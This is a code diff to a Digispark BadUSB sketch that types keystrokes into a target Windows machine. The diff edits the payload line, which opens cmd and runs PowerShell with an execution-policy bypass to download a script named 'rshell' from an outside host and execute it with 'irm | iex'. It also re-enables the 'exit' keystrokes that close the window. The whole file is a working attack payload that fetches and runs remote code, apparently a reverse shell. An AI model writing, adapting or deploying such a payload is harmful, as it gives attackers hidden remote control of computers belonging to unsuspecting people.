@@ -14,9 +14,9 @@ void loop() {
   DigiKeyboard.print("cmd");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(2300);
-  DigiKeyboard.print(F("powershell -NoP -W Hidden -ep Bypass \"irm -Uri https://t3l3machus.com/rshell:443 | iex\""));
+  DigiKeyboard.print(F("powershell -NoP -ep Bypass \" irm -Uri https://t3l3machus.com:443/rshell | iex\""));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  //DigiKeyboard.print("exit");
-  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("exit");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   for(;;){ }
 }
